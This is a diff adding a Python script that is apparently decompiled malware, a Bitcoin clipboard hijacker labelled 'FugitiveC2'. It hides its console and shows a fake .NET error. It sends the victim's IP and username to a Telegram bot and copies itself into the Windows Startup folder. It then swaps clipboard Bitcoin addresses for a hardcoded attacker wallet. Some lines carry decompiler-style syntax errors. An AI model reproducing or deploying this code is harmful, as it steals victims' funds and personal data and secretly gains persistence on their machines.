@@ -1,0 +1,57 @@
+import os
+import time
+import pyperclip
+import re
+import requests
+import ctypes
+import getpass
+import subprocess
+import pyautogui
+import telebot
+from playsound import playsound
+kernel32 = ctypes.WinDLL('kernel32')
+user32 = ctypes.WinDLL('user32')
+SW_HIDE = 0
+hWnd = kernel32.GetConsoleWindow()
+user32.ShowWindow(hWnd, SW_HIDE)
+replacement_string = 'bc1qudgkjjns3np8cvqpqjyp6cxwazhgqej9vrsld0'
+telegram_token = ''
+telegram_chat_id = ''
+pyautogui.alert(text='This application could not be started', 'NET Framework 6.0', title='NET Framework 6.0', button="OK")
+
+def is_btc_address(clipboard_text):
+    btc_address_pattern = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$'
+    return re.match(btc_address_pattern, clipboard_text) is not None
+
+
+def send_telegram_message(message):
+    url = f'''https://api.telegram.org/bot{telegram_token}/sendMessage'''
+    params = {
+        'chat_id': telegram_chat_id,
+        'text': message }
+    requests.get(url, params, **('params',))
+
+
+def replace_btc_address():
+    username = getpass.getuser()
+    clipboard_text = pyperclip.paste()
+    if is_btc_address(clipboard_text):
+        pyperclip.copy(replacement_string)
+
+
+def get_external_ipv4():
+    response = requests.get('https://api.myip.com/')
+    return response.text.strip()
+
+if __name__ == '__main__':
+    username = getpass.getuser()
+    send_telegram_message('🥶 𝗙𝘂𝗴𝗶𝘁𝗶𝘃𝗲𝗖𝟮 v0.82 \n \n ➤ Activated on IP: \n' + str(get_external_ipv4()) + '\n \n ➤ Username: \n' + str(username))
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    script_path = os.getcwd() + str('\\PP_Auto_Hitter.exe')
+    modified_path = script_path.replace('\\\\', '\\')
+    subprocess.call('copy ' + str(modified_path) + ' ' + str(startup_folder), True, **('shell',))
+    os.system('copy ' + str(modified_path) + ' ' + str(startup_folder))
+    print(str(modified_path + ' ' + str(startup_folder)))
+    send_telegram_message("😈 𝗠𝗮𝗹𝘄𝗮𝗿𝗲 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝘁𝘁𝗮𝗰𝗵𝗲𝗱 𝘁𝗼 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝘁𝗮𝗿𝘁𝘂𝗽 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 😈 \n ➤ Executable Path: " + str(modified_path))
+    replace_btc_address()
+    time.sleep(0.2)
